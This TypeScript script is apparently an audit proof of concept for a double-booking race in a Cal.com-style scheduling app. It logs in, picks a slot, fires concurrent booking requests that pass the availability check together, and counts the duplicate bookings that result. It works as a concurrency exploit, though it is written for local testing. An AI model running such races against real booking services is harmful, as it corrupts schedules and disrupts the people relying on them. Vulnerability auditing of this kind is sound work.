#!/usr/bin/env -S npx tsx
/**
 * PoC BUG-001 — double-booking race.
 *
 * Hypothesis: in packages/features/bookings/lib/service/RegularBookingService.ts,
 * `ensureAvailableUsers` runs OUTSIDE the transaction that ultimately creates
 * the Booking row (createBooking.ts:139). Two concurrent POST /api/book/event
 * for the same slot both pass the availability check before either is committed.
 *
 * The idempotencyKey extension only covers ACCEPTED + identical metadata, so
 * PENDING (requiresConfirmation) or distinct bookerEmail/responses slip through.
 *
 * Flow:
 *   1. Login as pro@example.com (no auth strictly required for booking, but
 *      lets us inspect bookings post-mortem).
 *   2. Resolve pro's username + pick a bookable personal event-type (`/30min`
 *      by default, or the first non-team event-type returned by
 *      eventTypes.list).
 *   3. Compute a target slot 14 days from now at 14:00 UTC (no DST surprises).
 *   4. Fire N concurrent POST /api/book/event with distinct bookerEmail.
 *   5. Count how many bookings actually exist for that slot.
 *
 * Exit codes: 1 = vuln confirmed, 0 = mitigated, 2/3 = inconclusive/error.
 *
 * Usage:
 *   yarn workspace @calcom/web dev   # in another terminal
 *   npx tsx scripts/audit-poc/poc-bug-001.ts
 *
 * Env:
 *   CONCURRENCY    default 5
 *   SLOT_DAYS      days from now for the target slot, default 14
 *   SLOT_HOUR_UTC  hour of day UTC, default 14 (avoids DST edges)
 *   EVENT_SLUG     override event-type slug (default: auto-detected)
 */

import { BASE, login, trpcQuery, type Session } from "./_lib";

const CONCURRENCY = Number(process.env.CONCURRENCY ?? 5);
const SLOT_DAYS = Number(process.env.SLOT_DAYS ?? 14);
const SLOT_HOUR_UTC = Number(process.env.SLOT_HOUR_UTC ?? 14);

type MinimalUser = { id: number; username: string | null };

type EventTypeGroup = {
  teamId: number | null;
  profile?: { username?: string | null; slug?: string | null };
  eventTypes: Array<{ id: number; slug: string; title: string; length: number; teamId?: number | null }>;
};

async function findPersonalEventType(sess: Session): Promise<{
  eventTypeId: number;
  eventTypeSlug: string;
  username: string;
  length: number;
}> {
  if (process.env.EVENT_SLUG) {
    // User overrode — fetch via list and find by slug.
    const list = await trpcQuery<{ eventTypeGroups: EventTypeGroup[] }>(
      sess,
      "eventTypes.getByViewer",
      { filters: {}, forRoutingForms: false }
    );
    for (const group of list.data?.eventTypeGroups ?? []) {
      if (group.teamId) continue;
      const evt = group.eventTypes.find((e) => e.slug === process.env.EVENT_SLUG);
      if (evt && group.profile?.username) {
        return {
          eventTypeId: evt.id,
          eventTypeSlug: evt.slug,
          username: group.profile.username,
          length: evt.length,
        };
      }
    }
    throw new Error(`No personal event-type with slug=${process.env.EVENT_SLUG}`);
  }

  const list = await trpcQuery<{ eventTypeGroups: EventTypeGroup[] }>(
    sess,
    "eventTypes.getByViewer",
    { filters: {}, forRoutingForms: false }
  );
  for (const group of list.data?.eventTypeGroups ?? []) {
    if (group.teamId) continue;
    const evt = group.eventTypes[0];
    if (evt && group.profile?.username) {
      return {
        eventTypeId: evt.id,
        eventTypeSlug: evt.slug,
        username: group.profile.username,
        length: evt.length,
      };
    }
  }
  throw new Error("no personal event-type found for pro@example.com");
}

function computeSlot(lengthMin: number): { start: string; end: string } {
  const now = new Date();
  // Pick SLOT_DAYS days from now at SLOT_HOUR_UTC:00 UTC.
  const start = new Date(Date.UTC(
    now.getUTCFullYear(),
    now.getUTCMonth(),
    now.getUTCDate() + SLOT_DAYS,
    SLOT_HOUR_UTC,
    0,
    0,
    0
  ));
  const end = new Date(start.getTime() + lengthMin * 60_000);
  return { start: start.toISOString(), end: end.toISOString() };
}

async function postBooking(
  eventTypeId: number,
  eventTypeSlug: string,
  username: string,
  start: string,
  end: string,
  bookerEmail: string,
  bookerName: string
): Promise<{ status: number; bookingId: number | null; body: string }> {
  const body = {
    eventTypeId,
    eventTypeSlug,
    user: username,
    start,
    end,
    timeZone: "Etc/UTC",
    language: "en",
    metadata: {},
    hasHashedBookingLink: false,
    responses: {
      name: bookerName,
      email: bookerEmail,
      guests: [],
      notes: "audit-poc-bug-001",
      location: { value: "integrations:daily", optionValue: "" },
    },
  };
  const res = await fetch(`${BASE}/api/book/event`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  const text = await res.text();
  let bookingId: number | null = null;
  try {
    const parsed = JSON.parse(text) as { id?: number };
    if (typeof parsed.id === "number") bookingId = parsed.id;
  } catch {
    /* non-JSON error body */
  }
  return { status: res.status, bookingId, body: text };
}

async function countBookingsAt(sess: Session, eventTypeId: number, start: string): Promise<number> {
  // Use bookings.get with status=upcoming and filter manually on startTime.
  const list = await trpcQuery<{ bookings: Array<{ id: number; startTime: string; eventTypeId: number | null }> }>(
    sess,
    "bookings.get",
    { filters: { status: "upcoming" }, limit: 100 }
  );
  if (!list.ok || !list.data) {
    console.log(`    (bookings.get failed: status=${list.status} code=${list.error?.code}; falling back to 0)`);
    return 0;
  }
  const target = new Date(start).getTime();
  return list.data.bookings.filter(
    (b) => b.eventTypeId === eventTypeId && new Date(b.startTime).getTime() === target
  ).length;
}

async function main() {
  console.log("=== PoC BUG-001 — double-booking race ===");
  console.log(`base = ${BASE}, concurrency = ${CONCURRENCY}`);

  const OWNER_EMAIL = process.env.OWNER_EMAIL ?? "audit-poc-owner@local.test";
  const OWNER_PASSWORD = process.env.OWNER_PASSWORD ?? "audit-poc-owner-pw";
  console.log(`[1] login owner=${OWNER_EMAIL}`);
  const pro = await login(OWNER_EMAIL, OWNER_PASSWORD);

  console.log("[2] resolve bookable event-type");
  let evt: { eventTypeId: number; eventTypeSlug: string; username: string; length: number };
  if (process.env.EVENT_TYPE_ID && process.env.EVENT_OWNER_USERNAME) {
    evt = {
      eventTypeId: Number(process.env.EVENT_TYPE_ID),
      eventTypeSlug: process.env.EVENT_SLUG ?? "audit-30min",
      username: process.env.EVENT_OWNER_USERNAME,
      length: Number(process.env.EVENT_LENGTH ?? 30),
    };
  } else {
    evt = await findPersonalEventType(pro);
  }
  console.log(`    eventTypeId=${evt.eventTypeId} slug=/${evt.username}/${evt.eventTypeSlug} length=${evt.length}min`);

  const { start, end } = computeSlot(evt.length);
  console.log(`[3] target slot: ${start} → ${end} (Etc/UTC)`);

  // Pre-flight: how many bookings already exist at this slot? Should be 0.
  const before = await countBookingsAt(pro, evt.eventTypeId, start);
  console.log(`[4] bookings before: ${before}`);
  if (before > 0) {
    console.log("    (slot already has a booking — pick another day via SLOT_DAYS=N)");
  }

  console.log(`[5] firing ${CONCURRENCY} concurrent bookings…`);
  const t0 = Date.now();
  const results = await Promise.all(
    Array.from({ length: CONCURRENCY }, (_, i) =>
      postBooking(
        evt.eventTypeId,
        evt.eventTypeSlug,
        evt.username,
        start,
        end,
        `audit-poc-${i}-${Date.now()}@example.com`,
        `Audit PoC ${i}`
      )
    )
  );
  const elapsed = Date.now() - t0;

  console.log(`    elapsed: ${elapsed}ms`);
  const tally: Record<number, number> = {};
  const ids: number[] = [];
  for (const r of results) {
    tally[r.status] = (tally[r.status] ?? 0) + 1;
    if (r.bookingId !== null) ids.push(r.bookingId);
  }
  console.log(`    status tally: ${JSON.stringify(tally)}`);
  console.log(`    booking ids:  ${ids.join(", ") || "(none)"}`);

  // First non-2xx error message (for debugging)
  const firstError = results.find((r) => r.status >= 400);
  if (firstError) {
    console.log(`    first error body (truncated): ${firstError.body.slice(0, 300)}`);
  }

  console.log("[6] count bookings for the slot after the burst");
  const after = await countBookingsAt(pro, evt.eventTypeId, start);
  const newCount = after - before;
  console.log(`    bookings after: ${after} (new: ${newCount})`);

  console.log("");
  if (newCount > 1) {
    console.log(
      `[VULN CONFIRMED] ${newCount} bookings created for slot ${start} (expected 1) — ensureAvailableUsers TOCTOU`
    );
    process.exit(1);
  }
  if (newCount === 1) {
    const errors = CONCURRENCY - 1;
    console.log(
      `[MITIGATED] exactly 1 booking created, ${errors} requests rejected (expected behaviour)`
    );
    process.exit(0);
  }
  console.log(
    `[INCONCLUSIVE] new bookings=${newCount}, status tally=${JSON.stringify(tally)} — investigate manually`
  );
  process.exit(2);
}

main().catch((e) => {
  console.error(`[ERROR] ${(e as Error).message}`);
  if ((e as Error).stack) console.error((e as Error).stack);
  process.exit(3);
});
